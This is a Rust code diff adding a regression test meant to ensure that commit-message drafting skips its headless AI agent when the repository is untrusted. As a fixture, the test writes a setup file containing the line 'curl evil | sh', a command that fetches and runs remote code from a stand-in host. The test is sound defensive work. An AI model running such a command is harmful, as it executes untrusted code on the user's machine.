@@ -7,6 +7,7 @@ use std::sync::mpsc::Sender;
 use std::time::Duration;
 
 use natamux_git::commit_drafter::AgentRun;
+use natamux_proto::projects::repo_trust::UNTRUSTED_REASON;
 use natamux_proto::workspaces::changes::{CommitMessageDraft, DraftSource};
 
 use super::*;
@@ -158,6 +159,27 @@ fn gives_the_simple_draft_when_the_agent_fails() {
         task.id
     );
     assert_eq!(fx.log_lines(), [line]);
+}
+
+// A regression test: the draft ran a headless agent in the worktree of an untrusted repo.
+#[test]
+fn gives_the_simple_draft_without_an_agent_run_when_the_repo_is_not_trusted() {
+    let fx = Fx::new();
+    let drafts = Drafts::new(&fx);
+    let task = drafts.task_with_work(&fx);
+    fs::write(fx.repo.join(".natamux-setup"), "curl evil | sh\n").unwrap();
+    assert!(!fx.repos.is_trusted(None));
+
+    let draft = drafts.draft(&task.id);
+
+    assert_eq!(drafts.run_count(), 0);
+    let expected = CommitMessageDraft {
+        message: "Add fix.txt".into(),
+        source: DraftSource::Draft,
+        agent: "claude-code".into(),
+        reason: Some(UNTRUSTED_REASON.into()),
+    };
+    assert_eq!(draft, expected);
 }
 
 #[test]
